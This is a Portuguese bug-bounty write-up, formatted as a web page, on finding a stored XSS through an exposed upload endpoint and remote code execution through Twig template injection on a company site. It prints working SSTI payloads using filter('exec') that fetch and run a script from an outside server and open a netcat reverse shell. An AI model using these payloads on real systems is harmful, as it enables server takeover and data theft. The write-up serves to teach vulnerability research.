<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>EXPLOIT</title>
  <link rel="stylesheet" href="../estilo.css">
  <style>
    .command-block {
      background-color: #1E1E1E; 
      border: 1px solid #3c3c3c;
      padding: 10px;
      border-radius: 5px;
      margin-top: 10px;
    }

    .cor_aqui {
      color: #999999;
    }

  </style>
</head>
<body>
  <div class="container">
    <header>
      <h1>...</h1>
    </header>
    <nav id="ss">
      <ul>
        <li><a href="../index.html">Sobre Mim</a></li>
        <li><a href="../achados.html">Meus Achados!</a></li>
        <li><a href="#">Contato</a></li>
      </ul>
    </nav>
    <section>
      <div class="cor_aqui">
        <h1>STORED XSS E RCE VIA SSTI!!!</h1>
      </div>
      
      <p id="fala">Fala, hunters! Tô trazendo mais um write-up sobre dois achados interessantes. Espero que esse conteúdo ajude outros caçadores e que você saia daqui tendo aprendido, ao menos, algo novo!</p>
      <br>
      <p>Bom, eu já tinha encontrado alguns XSS refletidos nessa aplicação, através de fuzzing, utilizando o ffuf — isso, há meses.</p>
      <p>Porém, eu me lembrei desse alvo e resolvi testá-lo novamente.</p>
      <p>Resumindo: encontrei esse site; vou chamá-lo de:</p>
      <div class="command-block">
        <code>https://site.redbullmzr.com</code>
      </div>
      <br>
      <p>Ao acessar o site, temos a seguinte página:</p>
      <p>Uma página 404!</p>
      <img src="../files/files4/xss/0.png" style="max-width: 100%; height: auto;" alt="Exemplo de imagem">
      
      <p>Fui para minha aba de favoritos e cliquei no meu "bookmarklet". É um código JavaScript que vai me mostrar todos os possíveis endpoints dentro do código JavaScript da aplicação web.</p>
      <img src="../files/files4/xss/001.png" style="max-width: 100%; height: auto;" alt="Exemplo de imagem">
      <p>Repare que ele me deu este endpoint:</p>
      <div class="command-block">
        <code>/mtt/public/acc/teste/s/</code>
      </div>
      <p>Fui para o DevTools e comecei a entender o contexto em que ele era utilizado.</p>
      <br>
      <p>Depois de um tempo procurando, encontrei isso:</p>
      <div class="command-block">
        <code>/mtt/public/acc/teste/s/</code>
      </div>
      <br>
      <img src="../files/files4/xss/1.png" style="max-width: 100%; height: auto;" alt="Exemplo de imagem">
      
      <p>Ao acessar esse endpoint via browser, temos a seguinte página:</p>

      <img src="../files/files4/xss/2.png" style="max-width: 100%; height: auto;" alt="Exemplo de imagem">
      <p>Quando testei isso, pensei que não seria nada e deixei para lá. Voltei a fazer fuzzing com o ffuf, igual da primeira vez que encontrei esse site, mas, sem sucesso, obtive os mesmos endpoints de antes e nada de novo.</p>
      <p>Isso acontece às vezes quando tô caçando: estou olhando algo e, quando estou prestes a desistir daquele alvo, tento dar uma última olhada e encontro algo. Recomendo muito: quando você estiver caçando e quiser desistir, dê uma pausa e depois volte com a cabeça mais limpa, para ver se encontra algo.</p>
      <p>Cavando mais fundo, com paciência, encontrei essa função:</p>

      <img src="../files/files4/xss/3.png" style="max-width: 100%; height: auto;" alt="Exemplo de imagem">
      <p>Essa função envia um ou mais arquivos para <code>base/uploadResource</code> e retorna a resposta do servidor.</p>

      <p>Fui para o proxy e tentei enviar uma request para:</p>
      <div class="command-block">
        <code>https://site.redbullmzr.com/base/uploadResource</code>
      </div>
      <img src="../files/files4/xss/4.png" style="max-width: 100%; height: auto;" alt="Exemplo de imagem">
      <p>Mas não funcionou.</p>

      <p>Lembrei do primeiro endpoint que encontramos:</p>

      <div class="command-block">
        <code>/mtt/public/acc/teste/s/</code>
      </div>
      <br>

      <img src="../files/files4/xss/1.png" style="max-width: 100%; height: auto;" alt="Exemplo de imagem">
      <br>
        
      <br>

      <p>E tentei acessar o endpoint da função a partir dele:</p>

      <div class="command-block">
        <code>https://site.redbullmzr.com//mtt/public/acc/teste/s/base/uploadResource</code>
      </div>
      <p>Enviando uma requisição POST, tivemos uma resposta diferente!</p>

      <img src="../files/files4/xss/5.png" style="max-width: 100%; height: auto;" alt="Exemplo de imagem">
      <p>Dessa vez, o servidor aceitou nossa solicitação e interpretou a request.</p>
  
      <p>A partir daqui percebi que conseguimos enviar arquivos para o servidor tentei envia um arquivo .php, mas não conseguimos acessá-los diretamente. O que acontece é que só podemos visualizar o conteúdo por meio de uma rota que ele nos retorna.</p>
      <p>Então pensei: se enviarmos um HTML completo com uma payload de XSS, teremos um **Stored XSS** na aplicação!</p>

      <p>Enviei a nova request com todos os campos necessários:</p>
      <br>
      <img src="../files/files4/xss/6.png" style="max-width: 100%; height: auto;" alt="Exemplo de imagem">

      <p>Note que o endpoint que eles retornaram não foi o arquivo em si, mas sim uma rota que exibe o conteúdo dele.</p>
      <p>Como enviamos um HTML completo, o servidor renderizou o conteúdo para a gente!</p>
      <p>Se pegarmos o path que ele nos deu e acessarmos via browser:</p>

      <div class="command-block">
        <code>https://site.redbullmzr.com/mtt/publc/misc/files/resource/202508/dGVzdGUudHh0__68b4924a14938</code>
      </div>
      <p>Temos um Stored XSS!</p>
      <img src="../files/files4/xss/7.png" style="max-width: 100%; height: auto;" alt="Exemplo de imagem">

      <p>Bem interessante esse achado! Reportei e fui dormir.</p>
      <p>No outro dia, continuei olhando o alvo, e a próxima vulnerabilidade me surpreendeu ainda mais!</p>
      <p>Dormindo...</p>
      <br><br><br>
      <p>ACORDEI NO PRÓXIMO DIA!</p>
      <p>Vamos lá...</p>

      <h1>RCE VIA SSTI!!!</h1>
      <p>Voltei a olhar os JavaScript com paciência e olhei por um bom tempo; não encontrei nada. Pensei: "ok, não tem mais vulnerabilidades aqui".</p>
      <p>Mas me lembrei do velho e bom Google Dork.</p>
      <p>Pesquisando no Google (ainda no mesmo site):</p>
      <div class="command-block">
        <code>site:site.redbullmzr.com</code>
      </div>
      <p>Me deparei com isso:</p>
      <img src="../files/files4/1.png" style="max-width: 100%; height: auto;" alt="Exemplo de imagem">

      <p>Ao acessar a URL que encontramos com o dork:</p>
      <br>
      <div class="command-block">
        <code>https://site.redbullmzr.com/media/17****/accreditation?lang=de/</code>
      </div>
      <br>
      <p>Caímos nessa página:</p>
      <p>Nela estava falando "infelizmente o portal de inscrição já está fechado".</p>
      <img src="../files/files4/2.png" style="max-width: 100%; height: auto;" alt="Exemplo de imagem">

      <p>Anotei a URL e continuei analisando os JavaScript da aplicação.</p>
      <p>Resolvi ir para o DevTools e procurar qualquer coisa relacionada a "accreditation", já que isso estava na URL que encontramos com o Google Dork.</p>
  
      <p>Olhando mais a fundo, encontrei isso:</p>
      <div class="command-block">
        <code>/accreditation/:evend_id/register</code>
      </div>
      <img src="../files/files4/3.png" style="max-width: 100%; height: auto;" alt="Exemplo de imagem">

      <p>Se você perceber, temos um possível <code>event_id</code> na URL que encontramos pelo Google Dork.</p>
      <p>A URL foi:</p>
      <div class="command-block">
        <code>url encontrada com o Google Dork::: &gt;&gt; https://site.redbullmzr.com/media/17****/accreditation?lang=de/</code>
      </div>

      <p>E, segundo o código JavaScript, existe outro endpoint que pode ser acessado através desse <code>event_id</code>.</p>
      <p>Decidi testar o <code>'17****'</code> como possível event_id.</p>
      <p>Ao acessar:</p>

      <div class="command-block">
        <code>https://site.redbullmzr.com/accreditation/17****/register</code>
      </div>

      <p>Tivemos esta página:</p>
      <p>Um formulário com vários campos para preencher.</p>
      <img src="../files/files4/4.png" style="max-width: 100%; height: auto;" alt="Exemplo de imagem">

      <p>Preenchi todos os campos do formulário, coloquei meu e-mail e inseri a payload de SSTI <code>{{7*7}}</code> no campo de nome do usuário.</p>
      <p>Enviei e recebi isto por e-mail:</p>
      <img src="../files/files4/5.png" style="max-width: 100%; height: auto;" alt="Exemplo de imagem">
      <p>O resultado retornado foi <code>49</code>, confirmando que a aplicação estava processando templates do Twig em PHP.</p>
      <p>Eu supus que estava usando o Twig pelo processo de recon e pela análise dos JavaScript.</p>
      <br><br>
      <p>Enviei novamente, desta vez com a payload abaixo:</p>

      <div class="command-block">
        <code>{{ ['curl http://site/${id} /']|filter('exec') }}</code>
      </div>
      <p>Request enviada!</p>

      <img src="../files/files4/6.png" style="max-width: 100%; height: auto;" alt="Exemplo de imagem">

      <p>Request recebida no meu servidor:</p>

      <img src="../files/files4/7.png" style="max-width: 100%; height: auto;" alt="Exemplo de imagem">

      <p>Então criei um script em Bash para enviar para o servidor vulnerável (no meu servidor):</p>
      <img src="../files/files4/8.png" style="max-width: 100%; height: auto;" alt="Exemplo de imagem">

      <p>Criei o arquivo e subi um servidor Python na porta 80 (no meu servidor):</p>
      <div class="command-block">
        <code>python3 -m http.server 80</code>
      </div>
      <br>
      
      <img src="../files/files4/442.png" style="max-width: 100%; height: auto;" alt="Exemplo de imagem">

      <p>Voltando ao proxy, enviei a seguinte payload no campo "firstname":</p>
      <div class="command-block">
        <code>{{ ['curl http://site/xx.sh /']|filter('exec') }}</code>
      </div>
      <br>
      <img src="../files/files4/9.png" style="max-width: 100%; height: auto;" alt="Exemplo de imagem">
      <p>Baixando o <code>xxx.sh</code> e dando permissão na máquina vulnerável:</p>
      <div class="command-block">
        <code>{{ ['curl http://site/xx.sh -o /tmp/xxx.sh /']|filter('exec') }}</code><br>
        <code>{{ ['chmod +x /tmp/xxx.sh /']|filter('exec') }}</code>
      </div>

      <br><br>
      <img src="../files/files4/10.png" style="max-width: 100%; height: auto;" alt="Exemplo de imagem">
      <br><br>

      <p>Escutando com o netcat na porta 4445 (no meu servidor):</p>
      <div class="command-block">
        <code>nc -vnlp 4445</code>
      </div>
      <br>
  
      <img src="../files/files4/11.png" style="max-width: 100%; height: auto;" alt="Exemplo de imagem">
      <br>

      <p>Executei o <code>xxx.sh</code> e recebi a shell reversa!</p>
      <div class="command-block">
        <code>{{ ['curl -X POST -d $(bash /tmp/xxx.sh) http://site /']|filter('exec') }}</code>
      </div>
      <br>
      <img src="../files/files4/12.png" style="max-width: 100%; height: auto;" alt="Exemplo de imagem">
      <p>Temos acesso completo ao servidor!</p>
      <br><br>
      <p>Resultados! Os XSS foram em outros sites da Red Bull. Em breve posso trazer algo sobre a técnica que utilizei para encontrá-los!</p>
       <img src="../files/files4/foto1.png" style="max-width: 100%; height: auto;" alt="Exemplo de imagem">
      <img src="../files/files4/foto2.png" style="max-width: 100%; height: auto;" alt="Exemplo de imagem">
      <img src="../files/files4/Screenshot_1.png" style="max-width: 100%; height: auto;" alt="Exemplo de imagem">
      <p>Eu estava lendo um artigo qualquer na internet e, nele, o autor falou: "quando você lê um write-up, vê apenas o resumo e parece mais fácil". Imagine que eu tive que começar do zero, sem entender nada dessa aplicação; com o passar do tempo, fui montando as peças e entendendo como aquela aplicação funcionava, mesmo sem ver nada visualmente — as funções ainda existiam nos JavaScript e tudo foi fazendo sentido.</p>
      <p></p>
      <p>Espero ter ajudado alguém com este write-up. Eu realmente acredito que o conhecimento tem que ser compartilhado, pois também foi através de outras pessoas que obtive grande parte do meu aprendizado! Se você está precisando de inspiração, assista a um vídeo do meu hacker favorito.</p>
      <h1><a href="https://youtu.be/nDgUsOS7kpE" target="_blank">DAWGYG</a></h1>
      <h1><a href="https://emma-scott.co.uk/two-sides-of-hacking/" target="_blank">DAWGYG</a></h1>

    </section>
  </div>
</body>
</html>
